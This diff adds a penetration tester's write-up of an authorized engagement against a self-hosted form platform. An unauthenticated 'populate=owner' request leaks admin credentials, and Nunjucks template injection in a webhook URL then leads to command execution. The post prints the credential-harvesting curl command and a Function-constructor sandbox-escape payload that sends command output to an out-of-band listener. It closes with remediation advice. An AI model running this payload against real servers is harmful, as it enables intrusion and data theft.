@@ -1,0 +1,115 @@
+---
+title: "From an Anonymous GET to a Shell: SSTI in a Webhook URL"
+date: "2026-11-25"
+dateLabel: "2026"
+description: "A public endpoint that expanded form owners into full user objects, passwords included, and a webhook URL field rendered by a server-side template engine. Together they took an anonymous visitor to command execution on the server."
+tags: ["Web", "SSTI", "RCE", "Node.js", "Information Disclosure"]
+---
+
+## Where Templates Hide
+
+Server-side template injection is usually found in obvious places: an email template editor, a "customize your page" feature, an error message that reflects your input. The less obvious places are the ones developers do not think of as templates at all, like **configuration fields** that get interpolated before use. A webhook URL that supports placeholders such as `{{ submission.id }}` is a template, and whoever controls that field controls the template.
+
+My quick test for any field that might be rendered server-side is a math probe: put `{{7*7}}` somewhere it will be evaluated and watch for `49` to come out the other side, either in a response or out of band.
+
+## Background
+
+During an external assessment I found a self-hosted, open-source form-building platform the client used for internal business workflows. Dozens of forms, each owned by an administrator account. The instance had been online for years.
+
+<FlowChart
+  title="Anonymous to RCE"
+  steps={[
+    { label: "Step 1", title: "Public form list with owner expansion", subtitle: "Admin emails and passwords in the response", tone: "warn" },
+    { label: "Step 2", title: "Log in as administrator", subtitle: "Admin JWT, full platform access", tone: "warn" },
+    { label: "Step 3", title: "Webhook URL with {{7*7}}", subtitle: "Out-of-band hit on /probe-49", tone: "warn" },
+    { label: "Step 4", title: "Sandbox escape via Function constructor", subtitle: "child_process reachable", tone: "critical" },
+    { label: "Result", title: "Command execution + webroot write", subtitle: "Running as www-data", tone: "critical" },
+  ]}
+/>
+
+## Step 1: Asking the API for More Than It Should Give
+
+The platform's public endpoint that lists forms supported a parameter to **expand related objects**, a common API convenience so the client does not need a second request. Expanding the `owner` of each form returned the full owner record, not just a name. That record included the owner's email and password.
+
+```bash
+curl -s "https://<forms-host>/form?limit=9999&populate=owner" \
+| python3 -c '
+import json, sys
+seen = {}
+for f in json.load(sys.stdin):
+    o = f.get("owner")
+    if isinstance(o, dict):
+        seen[o["_id"]] = o
+for o in seen.values():
+    d = o.get("data") or {}
+    print(o.get("roles"), d.get("email"), "<password redacted>")
+'
+```
+
+No authentication was involved. Fourteen administrator accounts came back.
+
+<Concept>
+**Relationship expansion** features (`populate`, `include`, `expand`, `fields`) are a frequent source of data leaks because the access check is done on the object you asked for, not on the related objects that get pulled in. The form was public, so the request was allowed; nobody checked whether the owner's full user record should be public too.
+</Concept>
+
+## Step 2: Becoming an Administrator
+
+Those credentials worked on the regular login endpoint, which returned a JWT for the administrator role. With it, the admin API listed every account and allowed full management of forms and their **actions**: automations that run when someone submits a form, such as sending an email or calling a webhook.
+
+## Step 3: The Webhook URL Is a Template
+
+I created a webhook action on a test form, with a URL pointing to an out-of-band listener and a math probe in the path:
+
+```text
+https://<oob-listener>/probe-{{7*7}}
+```
+
+Submitting the form made the server call `https://<oob-listener>/probe-49`. The URL field was being rendered by **Nunjucks**, a JavaScript template engine, on the server.
+
+## Step 4: Escaping the Sandbox
+
+Template engines in JavaScript usually try to sandbox expressions, but they still hand you JavaScript objects. Every string has a `constructor` (`String`), and every function's constructor is `Function`, which compiles arbitrary code. From there, Node's `process.mainModule.require` reaches `child_process`. This is the same technique behind earlier public advisories for this platform, applied to a different field:
+
+```text
+https://<oob-listener>/cmd-{{"".constructor.constructor("return process.mainModule.require('child_process').execSync('id').toString('hex')")()}}
+```
+
+The listener received the hex-encoded output, which decoded to:
+
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+To show that this was more than read access, I wrote a harmless marker file into the web root through the same primitive and fetched it from the public site. That is effectively a web shell.
+
+<Concept>
+**Why the payload goes in the URL path and comes back hex-encoded:** the only output channel was the outgoing webhook request itself. Hex encoding keeps command output URL-safe, so it survives the trip to the listener intact. When an injection has no visible response, look for any request the server makes on your behalf and turn it into your exfiltration channel.
+</Concept>
+
+## Why This One Was Especially Bad
+
+A webhook action is **stored**. Once a malicious action is saved on a form, it fires on every future submission: it survives restarts, never touches the disk as a file, and does not show up in a file integrity scan. Combined with an instance that had been exposed for years, the client could not rule out that someone had done this before me.
+
+## What I Could and Could Not Prove
+
+Proven: unauthenticated disclosure of administrator credentials, administrator login, server-side template evaluation, OS command execution and a write into the public web root.
+
+Not done: I did not read the process environment (which would typically include the token signing secret and database URI) or touch the database. Shortly after the report, the client's IT team decommissioned the server, so there was no chance to revisit it.
+
+## Impact
+
+- **Remote code execution from an anonymous position**, no credentials or user interaction required
+- **Full access to the platform's data**: business forms and their submissions
+- **Persistent, file-less backdoor potential** through stored webhook actions
+
+## Remediation
+
+- **Strip sensitive fields from related objects** and block relationship expansion on public routes
+- **Do not render configuration fields as templates**, or render them in an isolated, logic-less engine with no access to language primitives
+- **Keep self-hosted platforms updated**: this class of bug has public advisories, and old instances are an easy target
+- **Rotate everything** after an exposure like this (admin passwords, token signing secret, database credentials) and audit stored actions for injected payloads
+- **Enable MFA** for administrator accounts and keep the admin interface off the public internet
+
+---
+
+*Vulnerability details have been generalized to protect client confidentiality. The issue was reported during an authorized engagement, and the affected server was decommissioned after the report.*
